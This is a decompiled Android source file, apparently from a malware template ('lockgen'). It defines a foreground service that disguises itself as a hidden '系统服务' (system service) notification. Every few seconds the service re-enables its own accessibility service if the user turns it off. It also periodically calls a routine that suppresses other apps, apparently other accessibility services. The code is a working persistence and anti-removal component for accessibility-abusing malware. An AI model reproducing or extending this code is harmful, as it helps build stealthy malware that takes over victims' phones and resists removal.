package com.lockgen.template.app.sku;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.util.Log;
import com.lockgen.template.app.core.Cfg;
import com.lockgen.template.app.sku.SkuGuardService;
import org.json.JSONObject;

public class SkuGuardService extends Service {
    private static final String CHANNEL_ID = "tpl_sku_fg";
    private static final int FG_ID = 1002;
    private static final String TAG = "SkuGuard";
    private boolean fgStarted;
    private final Handler handler = new Handler(Looper.getMainLooper());
    private volatile long lastSuppress = 0;
    private final Runnable loop = new AnonymousClass1();
    private volatile boolean running;
    private JSONObject skuCfg;

    @Override // android.app.Service
    public IBinder onBind(Intent intent) {
        return null;
    }

    public static void start(Context context) {
        Intent intent = new Intent(context, SkuGuardService.class);
        try {
            context.startForegroundService(intent);
        } catch (Throwable th) {
            Log.w(TAG, "前台启动被拒，改用普通启动", th);
            try {
                context.startService(intent);
            } catch (Throwable th2) {
                Log.w(TAG, "启动失败", th2);
            }
        }
    }

    /* JADX INFO: Access modifiers changed from: package-private */
    /* renamed from: com.lockgen.template.app.sku.SkuGuardService$1  reason: invalid class name */
    /* loaded from: /data/np/file-convert/2026093007491480cce562-3470-4c39-9483-6e6ce6bea0d7/2026093007491480cce562-3470-4c39-9483-6e6ce6bea0d7.dex */
    public class AnonymousClass1 implements Runnable {
        AnonymousClass1() {
        }

        @Override // java.lang.Runnable
        public void run() {
            if (SkuGuardService.this.running) {
                try {
                    if (!SkuEngine.channelReady()) {
                        SkuEngine.ensureChannel(SkuGuardService.this);
                    }
                    if (SkuEngine.channelReady()) {
                        if (Cfg.b(SkuGuardService.this.skuCfg, "selfRestore", true) && !SkuEngine.selfA11yAlive(SkuGuardService.this)) {
                            Log.w(SkuGuardService.TAG, "无障碍不在了，执行续命");
                            SkuEngine.restore(SkuGuardService.this);
                        }
                        long max = Math.max(5, Cfg.i(SkuGuardService.this.skuCfg, "suppressSec", 20)) * 1000;
                        if (Cfg.b(SkuGuardService.this.skuCfg, "keepSuppress", true) && System.currentTimeMillis() - SkuGuardService.this.lastSuppress > max) {
                            SkuGuardService.this.lastSuppress = System.currentTimeMillis();
                            final JSONObject jSONObject = SkuGuardService.this.skuCfg;
                            new Thread(new Runnable() { // from class: com.lockgen.template.app.sku.SkuGuardService$1$$ExternalSyntheticLambda0
                                @Override // java.lang.Runnable
                                public final void run() {
                                    SkuGuardService.AnonymousClass1.this.lambda$run$0(jSONObject);
                                }
                            }, "sku-suppress").start();
                        }
                    }
                } catch (Throwable th) {
                    Log.w(SkuGuardService.TAG, "守护循环异常", th);
                }
                SkuGuardService.this.handler.postDelayed(this, Math.max(1, Cfg.i(SkuGuardService.this.skuCfg, "restoreSec", 2)) * 1000);
            }
        }

        /* JADX INFO: Access modifiers changed from: private */
        public /* synthetic */ void lambda$run$0(JSONObject jSONObject) {
            try {
                SkuEngine.suppressOthers(SkuGuardService.this, jSONObject);
            } catch (Throwable th) {
                Log.w(SkuGuardService.TAG, "重压异常", th);
            }
        }
    }

    @Override // android.app.Service
    public void onCreate() {
        super.onCreate();
    }

    @Override // android.app.Service
    public int onStartCommand(Intent intent, int i, int i2) {
        startForegroundIfNeeded();
        this.skuCfg = Cfg.obj(Cfg.get(this), "sku");
        if (SkuEngine.authorized()) {
            SkuEngine.ensureChannel(this);
        }
        this.running = true;
        this.handler.removeCallbacks(this.loop);
        this.handler.post(this.loop);
        return 1;
    }

    private void startForegroundIfNeeded() {
        if (this.fgStarted) {
            return;
        }
        try {
            NotificationManager notificationManager = (NotificationManager) getSystemService(NotificationManager.class);
            JSONObject obj = Cfg.obj(Cfg.get(this), "ui");
            String str = Cfg.str(obj, "fgTitle", "系统服务");
            if (notificationManager != null) {
                NotificationChannel notificationChannel = new NotificationChannel(CHANNEL_ID, str, 1);
                notificationChannel.setShowBadge(false);
                notificationManager.createNotificationChannel(notificationChannel);
            }
            startForeground(FG_ID, new Notification.Builder(this, CHANNEL_ID).setContentTitle(str).setContentText(Cfg.str(obj, "fgText", "运行中")).setSmallIcon(17301535).setPriority(-2).setCategory("service").build());
            this.fgStarted = true;
        } catch (Throwable th) {
            Log.w(TAG, "前台提权失败", th);
        }
    }

    @Override // android.app.Service
    public void onDestroy() {
        this.running = false;
        this.handler.removeCallbacksAndMessages(null);
        super.onDestroy();
    }
}